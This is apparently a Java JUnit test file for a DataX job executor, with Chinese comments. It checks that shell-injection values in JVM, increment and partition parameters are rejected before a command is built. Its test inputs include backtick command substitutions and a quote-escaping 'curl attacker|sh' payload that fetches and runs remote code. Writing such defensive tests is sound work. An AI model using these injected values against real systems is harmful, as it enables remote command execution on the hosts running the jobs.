package com.wugui.datax.executor.service.command;

import com.wugui.datatx.core.biz.model.TriggerParam;
import com.wugui.datatx.core.enums.IncrementTypeEnum;
import org.junit.Assert;
import org.junit.Test;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;
import java.util.Date;

/**
 * 批次 10-F / 10-H 执行器侧：拼命令的那一刻必须自己再判一次。
 *
 * 管理端 add/update 已经拒收了，但执行器不能假设"能到我这儿的都是干净的"：
 * 库里可以有历史行，批量建任务会把模板里的 jvmParam 原样拷进新任务。
 * 这里钉的是顺序 —— 校验必须排在 datax.py 路径检查之前，更要排在拼出 argv 之前：
 * 一旦 argv 拼好交出去，datax.py 收尾就是 Popen(cmd, shell=True)，没有回头路。
 *
 * 10-H 起判定跟着 incrementType 走，所以每个用例都得把增量类型显式摆出来：
 * 一个不写增量类型的用例既测不到守卫，也测不到拼命令，只是看着像测了。
 */
public class BuildCommandShellSafetyTest {

    private static final Integer TIME = Integer.valueOf(IncrementTypeEnum.TIME.getCode());
    private static final Integer ID = Integer.valueOf(IncrementTypeEnum.ID.getCode());
    private static final Integer PARTITION = Integer.valueOf(IncrementTypeEnum.PARTITION.getCode());

    private static TriggerParam param(Integer incrementType, String jvmParam, String replaceParam,
                                      String replaceParamType, String partitionInfo) {
        TriggerParam tgParam = new TriggerParam();
        tgParam.setIncrementType(incrementType);
        tgParam.setJvmParam(jvmParam);
        tgParam.setReplaceParam(replaceParam);
        tgParam.setReplaceParamType(replaceParamType);
        tgParam.setPartitionInfo(partitionInfo);
        // 时间增量的两个分支都要读这两个时刻；拒收类用例走不到这里，给上是为了成功用例不 NPE
        tgParam.setStartTime(new Date(0L));
        tgParam.setTriggerTime(new Date(0L));
        return tgParam;
    }

    /** 只为了拿异常文案：dataXPyPath 故意给一个不存在的文件，安全判定必须排在它之前 */
    private static String refuseMessage(TriggerParam tgParam) {
        try {
            BuildCommand.buildDataXExecutorCmd(tgParam, "/tmp/does-not-matter.json",
                    "/tmp/no-such-datax.py", "python3");
            return null;
        } catch (IllegalStateException e) {
            return e.getMessage();
        }
    }

    @Test
    public void refusesToBuildAnyArgvForShellPayloadInJvmParam() {
        String message = refuseMessage(param(null, "-Xmx1g `touch /tmp/pwned`", null, null, null));
        Assert.assertNotNull("带反引号的 JVM 参数会经 datax.py 的 Popen(shell=True) 执行，必须拒绝拼这条命令", message);
        Assert.assertTrue(message, message.contains("拒绝执行该作业"));
        Assert.assertTrue(message, message.contains("反引号"));
    }

    @Test
    public void refusesToBuildAnyArgvForShellPayloadInReplaceParam() {
        String message = refuseMessage(param(TIME, null, "-Did>=%s\" ; curl attacker|sh ; \"", null, null));
        Assert.assertNotNull("能闭合掉 -p\"...\" 的双引号同样是命令注入", message);
        Assert.assertTrue(message, message.contains("增量替换参数"));
    }

    @Test
    public void refusesToBuildAnyArgvForShellPayloadInReplaceParamType() {
        // 10-H 的注入路径：反引号不是样式字母，会被 sdf.format() 原样带进 -p"..."
        String message = refuseMessage(param(TIME, null, "-Dstart=%s", "yyyy`touch /tmp/pwned`MM", null));
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("增量时间格式"));
        Assert.assertTrue(message, message.contains("反引号"));
    }

    @Test
    public void refusesToBuildAnyArgvForShellPayloadInPartitionInfo() {
        String message = refuseMessage(param(PARTITION, null, null, null, "dt`id`,-1,yyyyMMdd"));
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("分区信息的分区字段"));
    }

    @Test
    public void refusesToBuildAnyArgvForBrokenPartitionInfo() {
        // 执行器原本会带着半截分区配置起 DataX 进程，再在 buildPartition 里抛 NumberFormatException
        String message = refuseMessage(param(PARTITION, null, null, null, "dt,last,yyyyMMdd"));
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("必须是整数"));
    }

    @Test
    public void stillBuildsTheExpectedArgvForLegitimateParams() throws IOException {
        File dataxPy = File.createTempFile("datax", ".py");
        File tmpJson = File.createTempFile("job", ".json");
        dataxPy.deleteOnExit();
        tmpJson.deleteOnExit();
        try {
            String[] cmd = BuildCommand.buildDataXExecutorCmd(
                    param(TIME, "-Xmx1g", "-DstartId=id>=%s and id<=%s", "Timestamp", null),
                    tmpJson.getAbsolutePath(), dataxPy.getAbsolutePath(), "python3");

            Assert.assertEquals("python3", cmd[0]);
            Assert.assertEquals(dataxPy.getAbsolutePath(), cmd[1]);
            Assert.assertEquals(tmpJson.getAbsolutePath(), cmd[cmd.length - 1]);
            // -j 段与 -p 段合起来是**一个** argv 元素：BuildCommand 把整串参数里的空格替换成
            // 双引号-空格-双引号（cmdArr.add(doc.replaceAll(SPLIT_SPACE, TRANSFORM_SPLIT_SPACE))），
            // 靠 datax.py 那边的 shell 双引号把空格收回来。所以这里只能按前缀/包含断言，
            // 断言"等于 -j\"-Xmx1g\""会把一个合法结构判成失败。
            String doc = cmd[2];
            Assert.assertTrue(doc, doc.startsWith("-j\"-Xmx1g\""));
            Assert.assertTrue(doc, doc.contains("-p\"-DstartId=id>=0"));
        } finally {
            tmpJson.delete();
            dataxPy.delete();
        }
    }

    /**
     * 10-H 的口径一致性：分区三段现在两边都按 trim 后的值取。
     *
     * 改之前这里是 NumberFormatException（管理端判的时候 trim 了，执行器取值时没 trim），
     * 用户看到的现象是"界面提示合法、任务一跑就失败"。
     */
    @Test
    public void buildsPartitionArgvFromTrimmedSegments() throws IOException {
        File dataxPy = File.createTempFile("datax", ".py");
        dataxPy.deleteOnExit();
        try {
            String[] cmd = BuildCommand.buildDataXExecutorCmd(
                    param(PARTITION, null, null, null, "ds , 0 , yyyy-MM-dd"),
                    "/tmp/job.json", dataxPy.getAbsolutePath(), "python3");
            String joined = Arrays.toString(cmd);
            Assert.assertTrue(joined, joined.contains("-Dpartition=ds="));
            Assert.assertFalse("字段名两侧的空格不该被拼进命令行：" + joined, joined.contains("ds ="));
        } finally {
            dataxPy.delete();
        }
    }

    /**
     * " Timestamp " 这种带空格的取值现在必须走毫秒时间戳分支。
     *
     * 改之前它等不上 equals("Timestamp")，被当成日期样式喂给 new SimpleDateFormat，
     * 而 'T' 不是样式字母 —— 抛 IllegalArgumentException，任务日志只剩一行堆栈。
     */
    @Test
    public void treatsTimestampWithSurroundingSpacesAsTimestampBranch() throws IOException {
        File dataxPy = File.createTempFile("datax", ".py");
        dataxPy.deleteOnExit();
        try {
            String[] cmd = BuildCommand.buildDataXExecutorCmd(
                    param(TIME, null, "-Dstart=%s", " Timestamp ", null),
                    "/tmp/job.json", dataxPy.getAbsolutePath(), "python3");
            String joined = Arrays.toString(cmd);
            Assert.assertTrue(joined, joined.contains("-p\"-Dstart="));
            // 时间戳分支产出的是数字，日期样式分支才会产出斜杠
            Assert.assertFalse("不应把 \" Timestamp \" 当成日期样式：-p" + joined, joined.contains("Timestamp"));
        } finally {
            dataxPy.delete();
        }
    }

    @Test
    public void fallsBackToPythonWhenInterpreterNotConfigured() throws IOException {
        File dataxPy = File.createTempFile("datax", ".py");
        dataxPy.deleteOnExit();
        try {
            String[] cmd = BuildCommand.buildDataXExecutorCmd(param(null, "-Xmx1g", null, null, null),
                    "/tmp/job.json", dataxPy.getAbsolutePath(), "   ");
            Assert.assertEquals("python", cmd[0]);
        } finally {
            dataxPy.delete();
        }
    }
}
